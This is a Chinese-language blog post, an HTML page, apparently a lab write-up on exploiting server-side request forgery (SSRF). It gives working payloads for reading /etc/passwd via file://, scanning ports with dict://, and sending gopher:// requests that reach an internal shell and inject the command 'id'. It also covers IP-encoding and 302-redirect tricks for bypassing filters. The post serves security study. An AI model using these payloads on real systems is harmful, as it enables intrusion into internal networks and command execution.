@@ -1,0 +1,1088 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="rgba(71, 46, 98, 0.8)">
+  <meta name="author" content="kyrie711-wq">
+  <meta name="keywords" content="博客,技术,笔记">
+  
+    <meta name="description" content="SSRF漏洞原理和进阶利用这里用了两个靶场，推荐最完善的靶场 https:&#x2F;&#x2F;github.com&#x2F;Duoduo-chino&#x2F;ssrf-vul-for-new  漏洞原理SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等。SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF漏洞原理和进阶利用">
+<meta property="og:url" content="https://kyrie711-wq.github.io/2025/12/03/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="snowhy的博客">
+<meta property="og:description" content="SSRF漏洞原理和进阶利用这里用了两个靶场，推荐最完善的靶场 https:&#x2F;&#x2F;github.com&#x2F;Duoduo-chino&#x2F;ssrf-vul-for-new  漏洞原理SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等。SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kyrie711-wq.github.io/img/image-20251203220351550.png">
+<meta property="article:published_time" content="2025-12-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-04T08:02:46.566Z">
+<meta property="article:author" content="kyrie711-wq">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://kyrie711-wq.github.io/img/image-20251203220351550.png">
+  
+  
+  
+  <title>SSRF漏洞原理和进阶利用 - snowhy的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"kyrie711-wq.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>snowhy的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE/" target="_self">
+                <i class="iconfont icon-app"></i>
+                <span>安全项目</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" target="_self">
+                <i class="iconfont icon-bug-fill"></i>
+                <span>漏洞挖掘</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/CTF%E7%AB%9E%E8%B5%9B/" target="_self">
+                <i class="iconfont icon-flag-fill"></i>
+                <span>CTF竞赛</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/Web%E6%B8%97%E9%80%8F/" target="_self">
+                <i class="iconfont icon-windows-fill"></i>
+                <span>Web渗透</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/vdysjx.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SSRF漏洞原理和进阶利用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-03 00:00" pubdate>
+          December 3, 2025 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SSRF漏洞原理和进阶利用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SSRF漏洞原理和进阶利用"><a href="#SSRF漏洞原理和进阶利用" class="headerlink" title="SSRF漏洞原理和进阶利用"></a>SSRF漏洞原理和进阶利用</h1><p>这里用了两个靶场，推荐最完善的靶场</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Duoduo-chino/ssrf-vul-for-new">https://github.com/Duoduo-chino/ssrf-vul-for-new</a></p>
+<p><img src="/img/image-20251203220351550.png" srcset="/img/loading.gif" lazyload alt="image-20251203220351550"></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等。SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没有检测这个请求是否合法的），然后服务器以他的身份来访问服务器的其他资源。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p>
+<p>PHP中下面函数的使用不当会导致SSRF:</p>
+<p>  file_get_contents()<br>  fsockopen()<br>  curl_exec()   </p>
+<p>从漏洞挖掘的角度而言，见到有请求外部连接的参数，例如url&#x3D;，直接替换内网ip</p>
+<p>还有一些例如转发，下载等等收藏处，导入功能点，都会可能存在ssrf</p>
+<p><img src="/img/image-20251122145350622.png" srcset="/img/loading.gif" lazyload alt="image-20251122145350622"></p>
+<h2 id="SSRF之信息收集"><a href="#SSRF之信息收集" class="headerlink" title="SSRF之信息收集"></a>SSRF之信息收集</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>伪协议</p>
+<p>file:&#x2F;&#x2F; 从文件系统中读取文件</p>
+<p>dict:&#x2F;&#x2F;字典服务协议，访问字典资源，如dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info;</p>
+<p>ftp:&#x2F;&#x2F;可用于网络端口扫描</p>
+<p>s<a href="ftp://ssh文件传输协议或者安全文件传输协议/">ftp://SSH文件传输协议或者安全文件传输协议</a></p>
+<p>ldap：&#x2F;&#x2F;轻量级目录访问协议</p>
+<p>tftp:&#x2F;&#x2F;简单文件传输协议</p>
+<p>gopher:&#x2F;&#x2F; 分布式文档传递服务</p>
+<h3 id="扫描内网服务器"><a href="#扫描内网服务器" class="headerlink" title="扫描内网服务器"></a>扫描内网服务器</h3><p>查看主机账户密码</p>
+<p>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p>
+<p><img src="/img/image-20251122164047448.png" srcset="/img/loading.gif" lazyload alt="image-20251122164047448"></p>
+<p>查看当前操作系统的网卡的ip</p>
+<p>file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</p>
+<p><img src="/img/image-20251122164324152.png" srcset="/img/loading.gif" lazyload alt="image-20251122164324152"></p>
+<p>容器 IP <code>172.17.0.6</code> 属于 <code>172.17.0.0/16</code> 网段，这是 Docker 宿主机的桥接网络段,这样就可以去扫描其他内网服务</p>
+<p>显示arp缓存表（寻找内网其他主机）</p>
+<p>file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arp</p>
+<p><img src="/img/image-20251122165028455.png" srcset="/img/loading.gif" lazyload alt="image-20251122165028455"></p>
+<p>然后我们可以爆破这个网段的服务，再通过arp表查看存活主机</p>
+<p><img src="/img/image-20251122171716374.png" srcset="/img/loading.gif" lazyload alt="image-20251122171716374"></p>
+<p>爆破之后查看arp表，就能查看到存活的服务</p>
+<p><img src="/img/image-20251122170541930.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="dict伪协议探测端口"><a href="#dict伪协议探测端口" class="headerlink" title="dict伪协议探测端口"></a>dict伪协议探测端口</h3><p>在 SSRF 中 DICT 协议常用于探测内网端口开放情况，”dict:&#x2F;&#x2F;ip:prot”当遇到开放端口时，响应速度会明显变快，有的端口还会带 TCP 回显</p>
+<h6 id="一、DICT伪协议端口探测的核心原理"><a href="#一、DICT伪协议端口探测的核心原理" class="headerlink" title="一、DICT伪协议端口探测的核心原理"></a>一、DICT伪协议端口探测的核心原理</h6><blockquote>
+<h6 id="利用-SSRF-触发服务端建立-TCP-连接，而不验证协议是否正确，从而判断端口是否开放或服务类型。"><a href="#利用-SSRF-触发服务端建立-TCP-连接，而不验证协议是否正确，从而判断端口是否开放或服务类型。" class="headerlink" title="利用 SSRF 触发服务端建立 TCP 连接，而不验证协议是否正确，从而判断端口是否开放或服务类型。"></a><strong>利用 SSRF 触发服务端建立 TCP 连接，而不验证协议是否正确，从而判断端口是否开放或服务类型。</strong></h6></blockquote>
+<p>流程：</p>
+<ol>
+<li><p>SSRF 接受 URL 输入，例如：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//127.0.0.1:6379/</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>底层解析 URL → 尝试建立 TCP socket 连接</p>
+</li>
+<li><p>目标端口返回任何数据（哪怕报错）→都意味着端口开放</p>
+</li>
+<li><p>根据返回行为产生差异 → 用于端口扫描、服务识别</p>
+</li>
+</ol>
+<p>关键点在于：</p>
+<ul>
+<li><p><strong>DICT 是基于 TCP 的协议</strong></p>
+</li>
+<li><p>SSRF 框架会尝试连接远端，不关心是否真正是字典服务器</p>
+</li>
+<li><h6 id="只要能连接成功，就能获取响应"><a href="#只要能连接成功，就能获取响应" class="headerlink" title="只要能连接成功，就能获取响应"></a><strong>只要能连接成功，就能获取响应</strong></h6></li>
+</ul>
+<p>因此 DICT SSRF 本质上属于 <strong>协议欺骗（Protocol Smuggling）</strong>。</p>
+<hr>
+<h6 id="✅-二、差异体现在哪里？（判断端口状态）"><a href="#✅-二、差异体现在哪里？（判断端口状态）" class="headerlink" title="✅ 二、差异体现在哪里？（判断端口状态）"></a>✅ 二、差异体现在哪里？（判断端口状态）</h6><p>DICT SSRF 的结果<strong>本质是连接行为差异 + 返回内容差异</strong></p>
+<hr>
+<h6 id="1）连接行为差异-—-端口探测最直接："><a href="#1）连接行为差异-—-端口探测最直接：" class="headerlink" title="1）连接行为差异 — 端口探测最直接："></a>1）连接行为差异 — 端口探测最直接：</h6><table>
+<thead>
+<tr>
+<th>行为</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TCP 连接成功</td>
+<td>端口开放</td>
+</tr>
+<tr>
+<td><code>connection refused</code></td>
+<td>端口关闭</td>
+</tr>
+<tr>
+<td>超时</td>
+<td>被防火墙 DROP&#x2F;过滤</td>
+</tr>
+</tbody></table>
+<p>这类差异明确直接 → 能判断端口状态。</p>
+<hr>
+<h6 id="2）返回内容差异-—-服务识别"><a href="#2）返回内容差异-—-服务识别" class="headerlink" title="2）返回内容差异 — 服务识别"></a>2）返回内容差异 — 服务识别</h6><p>即便不是 DICT 协议，对方服务会返回 banner&#x2F;握手包：</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>特征</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Redis 6379</td>
+<td><code>-ERR</code></td>
+</tr>
+<tr>
+<td>MySQL 3306</td>
+<td>二进制握手包（乱码）</td>
+</tr>
+<tr>
+<td>HTTP 80</td>
+<td><code>HTTP/1.1</code> 开头</td>
+</tr>
+<tr>
+<td>SMTP 25</td>
+<td><code>220</code> 开头</td>
+</tr>
+<tr>
+<td>SSH 22</td>
+<td><code>SSH-2.0</code></td>
+</tr>
+</tbody></table>
+<p>说明：</p>
+<ul>
+<li><p><strong>DICT 的请求内容无意义</strong></p>
+</li>
+<li><p>但由于 TCP 连接建立 → 对方服务会按自身协议回复</p>
+</li>
+</ul>
+<p>➡️ 这就构成 <strong>协议指纹</strong>。</p>
+<hr>
+<h6 id="3）延迟差异-—-网络策略判断"><a href="#3）延迟差异-—-网络策略判断" class="headerlink" title="3）延迟差异 — 网络策略判断"></a>3）延迟差异 — 网络策略判断</h6><table>
+<thead>
+<tr>
+<th>状态</th>
+<th>表现</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>开放（有响应）</td>
+<td>很快</td>
+</tr>
+<tr>
+<td>拒绝（RST）</td>
+<td>很快</td>
+</tr>
+<tr>
+<td>防火墙 DROP</td>
+<td>非常慢（等待超时）</td>
+</tr>
+</tbody></table>
+<p>➡️ 用来判断 WAF&#x2F;ACL&#x2F;容器隔离策略。</p>
+<hr>
+<h6 id="🔥-概括一句话"><a href="#🔥-概括一句话" class="headerlink" title="🔥 概括一句话"></a>🔥 概括一句话</h6><blockquote>
+<p>DICT SSRF &#x3D; TCP 端口探测 + 服务指纹识别 + 网络策略检测</p>
+</blockquote>
+<hr>
+<p>挂到bp里面进行爆破</p>
+<p><img src="/img/image-20251124122337390.png" srcset="/img/loading.gif" lazyload alt="image-20251124122337390"></p>
+<p>通过响应长度能判断端口是否开放</p>
+<p><img src="/img/image-20251124122431915.png" srcset="/img/loading.gif" lazyload alt="image-20251124122431915"></p>
+<h3 id="Http伪协议探测目录"><a href="#Http伪协议探测目录" class="headerlink" title="Http伪协议探测目录"></a>Http伪协议探测目录</h3><p>这一步其实和前面的思路差不多，将url放到bp对其进行页面爆破，通过响应长度即可判断存在页面</p>
+<p><img src="/img/image-20251125210703616.png" srcset="/img/loading.gif" lazyload alt="image-20251125210703616"></p>
+<p>成功扫描出路径</p>
+<p><img src="/img/image-20251125210836067.png" srcset="/img/loading.gif" lazyload alt="image-20251125210836067"></p>
+<h2 id="gopher伪协议攻击"><a href="#gopher伪协议攻击" class="headerlink" title="gopher伪协议攻击"></a>gopher伪协议攻击</h2><p>基本格式</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP</span>数据流&gt;<br></code></pre></td></tr></table></figure>
+
+<p>注意：<port>默认为70 ，发起多条请求每条要用回车换行去隔开使用%0d%0a隔开，如果多个参数，参数之间的&amp;也需要进行URL编码</p>
+<h4 id="gopher伪协议构造GET攻击"><a href="#gopher伪协议构造GET攻击" class="headerlink" title="gopher伪协议构造GET攻击"></a>gopher伪协议构造GET攻击</h4><p><img src="/img/image-20251125211145553.png" srcset="/img/loading.gif" lazyload alt="image-20251125211145553"></p>
+<p>1、在页面端提交，因为从请求从跳板机发送到内网受害主机，需要在内网受害主机进行一次URL解码，那么我们就需要先将playload进行一次url编码</p>
+<p>playload:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/shell.php?cmd=cat+flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.72.23.22<br><br></code></pre></td></tr></table></figure>
+
+<p>注意最后要保留个换行</p>
+<p>进行一次url编码后得到</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%47</span><span class="hljs-variable">%45</span><span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%20</span><span class="hljs-variable">%48</span><span class="hljs-variable">%54</span><span class="hljs-variable">%54</span><span class="hljs-variable">%50</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%48</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%31</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%33</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br></code></pre></td></tr></table></figure>
+
+<p>完整在网页端提交的请求就是</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">172.72</span>.<span class="hljs-number">23.22</span>:<span class="hljs-number">80</span>/_<span class="hljs-variable">%47</span><span class="hljs-variable">%45</span><span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%20</span><span class="hljs-variable">%48</span><span class="hljs-variable">%54</span><span class="hljs-variable">%54</span><span class="hljs-variable">%50</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%48</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%31</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%33</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br></code></pre></td></tr></table></figure>
+
+
+
+<p>2、在bp端，由于BP 是「手动构造 HTTP 请求」的工具，不会像浏览器那样自动帮你补全编码 —— 你写的 payload 会原封不动发送给后端，所以需要手动完成「双重 URL 编码」，才能让后端解码后得到正确的 gopher URL。</p>
+<p>所以我们要先抓到包</p>
+<p><img src="/img/image-20251125215258816.png" srcset="/img/loading.gif" lazyload alt="image-20251125215258816"></p>
+<p>补全请求，如何进行两次url编码</p>
+<p><img src="/img/image-20251125215540692.png" srcset="/img/loading.gif" lazyload alt="image-20251125215540692"></p>
+<p><img src="/img/image-20251125215613841.png" srcset="/img/loading.gif" lazyload alt="image-20251125215613841"></p>
+<p>如此一来便能成功执行攻击</p>
+<h4 id="gopher伪协议构造POST攻击"><a href="#gopher伪协议构造POST攻击" class="headerlink" title="gopher伪协议构造POST攻击"></a>gopher伪协议构造POST攻击</h4><p>和上面步骤类似，但是不需要再加换行符，给改为POST的攻击代码即可</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.72.23.24<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>15<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;id</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20251127145238924.png" srcset="/img/loading.gif" lazyload alt="image-20251127145238924"></p>
+<h3 id="SSRF之环回地址绕过"><a href="#SSRF之环回地址绕过" class="headerlink" title="SSRF之环回地址绕过"></a>SSRF之环回地址绕过</h3><p>在一些情况下，请求的目的IP会被后端限制，比如不允许访问127.0.0.1</p>
+<p>这时候我们进行进制转换就能绕过</p>
+<table>
+<thead>
+<tr>
+<th>原始 IP（127.0.0.1）</th>
+<th>变形格式（可直接使用）</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>十进制点分格式</td>
+<td><code>127.0.0.2</code>、<code>127.0.1.1</code></td>
+<td>127.0.0.0&#x2F;8 网段全是本地回环地址，仅过滤 <code>127.0.0.1</code> 时可用</td>
+</tr>
+<tr>
+<td>十进制整数格式</td>
+<td><code>2130706433</code></td>
+<td>IP 转整数（127<em>256³+0</em>256²+0*256+1）</td>
+</tr>
+<tr>
+<td>八进制格式</td>
+<td><code>0177.0.0.1</code>、<code>017700000001</code></td>
+<td>前缀加 <code>0</code> 表示八进制，后端解析仍为 127.0.0.1</td>
+</tr>
+<tr>
+<td>十六进制格式</td>
+<td><code>0x7F.0.0.1</code>、<code>0x7F000001</code></td>
+<td>部分后端（如 curl）支持十六进制 IP 解析</td>
+</tr>
+<tr>
+<td>省略点分格式</td>
+<td><code>127.1</code>（等价 127.0.0.1）、<code>127.0.1</code></td>
+<td>后端自动补全前导 0，适用于简单过滤逻辑</td>
+</tr>
+</tbody></table>
+<p><img src="/img/image-20251126145236226.png" srcset="/img/loading.gif" lazyload alt="image-20251126145236226"></p>
+<h3 id="SSRF重定向绕过"><a href="#SSRF重定向绕过" class="headerlink" title="SSRF重定向绕过"></a>SSRF重定向绕过</h3><ul>
+<li><strong>前端攻击者</strong>：构造 <code>url=http://公网服务器A/redirect</code>（公网地址，后端校验合法）；</li>
+<li><strong>公网服务器 A</strong>：收到请求后返回 302 响应，响应头 <code>Location: gopher://127.0.0.1:80/_GET...</code>（目标是私网 &#x2F; 危险地址）；</li>
+<li><strong>后端服务器</strong>：执行 <code>curl($url)</code> 时，默认会自动跟随 302 跳转，最终访问 <code>Location</code> 中的私网 &#x2F; 危险地址，完成绕过。</li>
+</ul>
+<p><img src="/img/image-20251126134449331.png" srcset="/img/loading.gif" lazyload alt="image-20251126134449331"></p>
+<p>我们在vps上起一个php服务</p>
+<p><img src="/img/image-20251126141002284.png" srcset="/img/loading.gif" lazyload alt="image-20251126141002284"></p>
+<p><img src="/img/image-20251126141022877.png" srcset="/img/loading.gif" lazyload alt="image-20251126141022877"></p>
+<p>然后在令ssrf服务访问我们的vps服务即可</p>
+<p><img src="/img/image-20251126141113611.png" srcset="/img/loading.gif" lazyload alt="image-20251126141113611"></p>
